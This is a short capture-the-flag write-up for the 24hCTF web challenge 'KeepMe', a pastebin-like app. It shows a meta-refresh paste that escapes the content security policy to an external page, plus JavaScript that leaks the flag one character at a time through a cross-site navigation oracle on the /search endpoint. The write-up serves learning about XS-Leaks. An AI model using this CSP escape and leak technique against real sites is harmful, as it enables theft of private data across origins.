# 24hCTF - web - KeepMe

Categories: csp, xsleak

`KeepMe` is a Togosha-sponsored challenge that allows the user to
create an account, create pastes (think pastebin), search pastes
and report an URL.

When searching in pastes, the result is returned as a downloadable
page.

## Solution

After a bit of playing around with the `/static/js/main.js` page
and DOM clobbering, I started digging in XS Leaks technique and found
that the flag could be leaked using the `/search` endpoint.

To do so, we needed to get out of the CSP-constrained context of the
pastes. I used the following paste content to do so:

```
<meta http-equiv="refresh" content="0;URL='https://example.com/xsleak.html'"/>
```

Then, we could leak the flag character by character using something along:

```
var url = 'http://yogosha.24hctf.ca/search?query=';
var flag = "FLAG{ShOrtAf}";

var ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

for (var i = 0 ; i < ALPHA.length ; i++) {
        // Get a window reference
        let c = ALPHA[i];
        var win = window.open(url + flag + c);

        function foo(w, x) {
                return (() => {
                        try {
                                // If a navigation occurs, the iframe will be cross-origin,
                                // so accessing "win.origin" will throw an exception
                                w.origin;
                                window.open("/keep/" + flag + x);
                                parent.console.log('Download attempt detected');
                        } catch(e) {
                                parent.console.log('No download attempt detected');
                        }
                });
        }

        // Wait for the window to load.
        setTimeout(foo(win, c), 2000);
}


</script></body></html>
```

Nice challenge!


## References

https://xsleaks.dev/docs/attacks/navigations/
https://blog.bi0s.in/2021/08/30/Web/Fword-CTF-2021-Shisui-Write-up/
